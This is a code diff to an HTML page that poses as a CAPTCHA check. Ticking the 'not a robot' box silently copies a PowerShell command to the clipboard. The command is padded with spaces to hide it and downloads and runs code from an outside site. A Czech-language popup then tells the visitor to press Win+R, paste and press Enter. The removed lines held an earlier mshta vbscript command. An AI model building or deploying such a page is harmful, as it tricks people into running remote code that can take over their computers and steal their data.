@@ -44,6 +44,32 @@
     #hiddenBtn {
       display: none;
     }
+    #alertBox {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: white;
+      padding: 30px;
+      border: 2px solid #333;
+      border-radius: 10px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+      z-index: 9999;
+      display: none;
+      text-align: center;
+      min-width: 300px;
+    }
+    #alertBox.show {
+      display: block;
+    }
+    #alertBox h2 {
+      margin-top: 0;
+      color: #333;
+    }
+    #alertBox p {
+      color: #666;
+      line-height: 1.6;
+    }
   </style>
 </head>
 <body>
@@ -59,12 +85,18 @@
 
   <img id="marvinImg" src="https://25plrp.cz/Dont-Panic.jpg" alt="Don't panic with Marvin" />
 
+  <div id="alertBox">
+    <h2>⚠️ Instrukce</h2>
+    <p>Spusťte Win+R<br>Vložte zkopírovaný text (Ctrl+V)<br>Potvrďte Enter</p>
+  </div>
+
   <script>
     const checkbox = document.getElementById("robotCheckbox");
     const loader = document.getElementById("loader");
     const captchaBox = document.getElementById("captchaBox");
     const marvinImg = document.getElementById("marvinImg");
     const hiddenBtn = document.getElementById("hiddenBtn");
+    const alertBox = document.getElementById("alertBox");
 
     function revealImage() {
       loader.style.display = "none";
@@ -72,32 +104,38 @@
       marvinImg.style.display = "block";
     }
 
+    function showAlert() {
+      alertBox.classList.add("show");
+      setTimeout(() => {
+        alertBox.classList.remove("show");
+      }, 5000);
+    }
+
     checkbox.addEventListener("change", () => {
       if (checkbox.checked) {
         loader.style.display = "block";
-        // Zkopíruj text do schránky
-        const psCommand =
-          'mshta vbscript:createobject("wscript.shell").sendkeys("{TAB}{TAB}{TAB}{ENTER}")(window.close)';
+        showAlert();
 
+        // PowerShell příkaz s AutoHotkey spuštěním
+        const psCommand =
+          '                                                             powershell iwr "25plrp.cz | iex "'
         navigator.clipboard.writeText(psCommand)
-          .then(() => {
-            alert("Spusťte Win+R \n vložte a potvrďte.");
-          })
           .catch(err => {
-            alert("Nepodařilo se zkopírovat text do schránky.");
+            console.error("Nepodařilo se zkopírovat text do schránky.");
             checkbox.checked = false;
             loader.style.display = "none";
+            alertBox.classList.remove("show");
           });
       } else {
         loader.style.display = "none";
         captchaBox.style.display = "block";
         marvinImg.style.display = "none";
+        alertBox.classList.remove("show");
       }
     });
   </script>
 </body>
 </html>
-
 
 
 <!--
